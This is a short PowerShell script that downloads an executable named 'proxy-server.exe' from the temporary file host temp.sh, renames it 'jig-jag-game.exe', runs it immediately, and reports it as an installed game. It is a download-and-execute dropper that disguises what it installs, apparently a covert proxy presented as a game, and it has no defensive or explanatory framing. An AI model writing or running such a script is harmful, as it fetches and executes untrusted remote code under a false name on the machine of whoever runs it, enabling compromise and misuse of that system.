# 1. Set the URL of the .exe file (Replace with the actual download link)
$url = "https://temp.sh/YvdvP/proxy-server.exe"

# 2. Define the destination path in the Downloads folder
$destination = "$HOME\Downloads\jig-jag-game.exe"

Write-Host "Downloading jig-jag-game.exe..." -ForegroundColor Cyan

# 3. Download the file
try {
    Invoke-WebRequest -Uri $url -OutFile $destination
    Write-Host "Download complete: $destination" -ForegroundColor Green
}
catch {
    Write-Host "Error: Could not download the file. Please check the URL." -ForegroundColor Red
    return
}

# 4. Run the .exe and capture the process information
Write-Host "Starting installation..." -ForegroundColor Cyan
$process = Start-Process -FilePath $destination -PassThru

# 5. Get the Process ID and print the final message
if ($process) {
    $pidValue = $process.Id
    Write-Host "jig-jag-game.exe is installed with process ID: $pidValue" -ForegroundColor Yellow
} else {
    Write-Host "Failed to start the process." -ForegroundColor Red
}
